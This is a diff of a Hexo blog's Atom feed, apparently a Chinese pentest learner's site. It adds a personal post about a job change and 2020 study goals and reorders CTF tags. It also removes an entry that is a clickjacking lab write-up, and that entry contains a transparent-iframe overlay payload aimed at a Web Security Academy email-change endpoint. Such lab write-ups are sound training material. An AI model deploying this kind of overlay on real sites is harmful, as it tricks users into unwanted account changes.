@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-26T10:57:58.682Z</updated>
+  <updated>2020-01-08T09:04:04.510Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>最近情况和未来计划</title>
+    <link href="http://yoursite.com/2020/01/08/%E6%9C%80%E8%BF%91%E6%83%85%E5%86%B5%E5%92%8C%E6%9C%AA%E6%9D%A5%E8%AE%A1%E5%88%92/"/>
+    <id>http://yoursite.com/2020/01/08/%E6%9C%80%E8%BF%91%E6%83%85%E5%86%B5%E5%92%8C%E6%9C%AA%E6%9D%A5%E8%AE%A1%E5%88%92/</id>
+    <published>2020-01-08T08:52:14.000Z</published>
+    <updated>2020-01-08T09:04:04.510Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="最近情况"><a href="#最近情况" class="headerlink" title="最近情况"></a>最近情况</h2><p>年底了，忙着离职和面试，都忘记这边的日记情况了。8号入职了一些零零碎碎的东西都搞完了，闲下来可以写自己的东西，面试的时候真紧张啊，然后还会问到一些基础的题目，比如SQL注入的类型啊。记住了，下次面试前一定要记得去好好的刷下面试题。接下来做的工作是和移动端渗透有关系，今年也要好好准备接下来的目标了，让自己的2020年有个盼头，2018年元旦的时候，我还在考虑是不是会出现世界末日啊，或者像小说里面写的那样出现什么转基因生物，然后大家去打怪升级了。2019的大事也就俩件吧，钢铁侠挂了和我毕业了。</p><h3 id="今年的目标"><a href="#今年的目标" class="headerlink" title="今年的目标"></a>今年的目标</h3><ol><li><p>python脚本学习，程度到可以调用excel里面的数据写到另一个excel</p></li><li><p>Android编程学习，程度到可以入门</p><p>前俩个目标在4月份之前完成</p></li><li><p>4月份出去国内旅游一趟</p></li><li>9月份去一趟泰国或者日本</li><li>读完5本书</li><li>每周出去跑步4次</li><li>在今年最后的时候可以做到Android和iOS端都熟悉，然后做到基础逆向加web渗透</li><li>暂定</li></ol>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;最近情况&quot;&gt;&lt;a href=&quot;#最近情况&quot; class=&quot;headerlink&quot; title=&quot;最近情况&quot;&gt;&lt;/a&gt;最近情况&lt;/h2&gt;&lt;p&gt;年底了，忙着离职和面试，都忘记这边的日记情况了。8号入职了一些零零碎碎的东西都搞完了，闲下来可以写自己的东西，面试的时候真紧
+      
+    
+    </summary>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
+    
+      <category term="目标" scheme="http://yoursite.com/tags/%E7%9B%AE%E6%A0%87/"/>
+    
+  </entry>
   
   <entry>
     <title>进阶题目2</title>
@@ -38,9 +68,9 @@
       <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
     
     
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
       <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
   </entry>
   
@@ -66,9 +96,9 @@
       <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
     
     
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
       <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
   </entry>
   
@@ -94,9 +124,9 @@
       <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
     
     
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
       <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
   </entry>
   
@@ -549,36 +579,6 @@
 &lt;p&gt;&lt;img src=&quot;http://q20wi1s2d.bkt.clouddn.com/UI劫持3目标.png&quot; alt=&quot;UI劫持3目标&quot;&gt;&lt;/p&gt;
 &lt;p&gt;在src的属性  那里就是原来的URL后面加上   ?xxx=xxxx&lt;/p&gt;
 &lt;p&gt;例
-      
-    
-    </summary>
-    
-    
-      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
-    
-      <category term="UI劫持" scheme="http://yoursite.com/tags/UI%E5%8A%AB%E6%8C%81/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>预先填写的表单输入劫持</title>
-    <link href="http://yoursite.com/2019/12/08/%E9%A2%84%E5%85%88%E5%A1%AB%E5%86%99%E7%9A%84%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E5%8A%AB%E6%8C%81/"/>
-    <id>http://yoursite.com/2019/12/08/%E9%A2%84%E5%85%88%E5%A1%AB%E5%86%99%E7%9A%84%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E5%8A%AB%E6%8C%81/</id>
-    <published>2019-12-08T09:10:40.000Z</published>
-    <updated>2019-12-08T09:30:35.826Z</updated>
-    
-    <content type="html"><![CDATA[<p>和UI劫持一的实验相比  就是多一个表单  然后我们提前在里面输入电子邮件，然后可以多一个点击点  ，进行操作</p><p>UI劫持2成功</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/UI劫持2成功.png" alt="UI劫持2成功"></p><p>UI劫持2目标</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/UI劫持2目标.png" alt="UI劫持2目标"></p><p>实验室  渗透利用代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">   iframe &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">       position:relative;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">       width:700px;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">       height: 500px;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">       opacity: 0.0001;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">       z-index: 2;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">   div &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">       position:absolute;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">       top:420px;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">       left:80px;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">       z-index: 1;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;style&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">&lt;div&gt;Click me&lt;&#x2F;div&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;ac651fa21ef1d5a88006bb7000280040.web-security-academy.net&#x2F;email?email&#x3D;hacker@attacker-website.com&quot;&gt;&lt;&#x2F;iframe&gt;</span></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;和UI劫持一的实验相比  就是多一个表单  然后我们提前在里面输入电子邮件，然后可以多一个点击点  ，进行操作&lt;/p&gt;
-&lt;p&gt;UI劫持2成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://q20wi1s2d.bkt.clouddn.com/UI劫持2成功.png&quot; alt
       
     
     </summary>
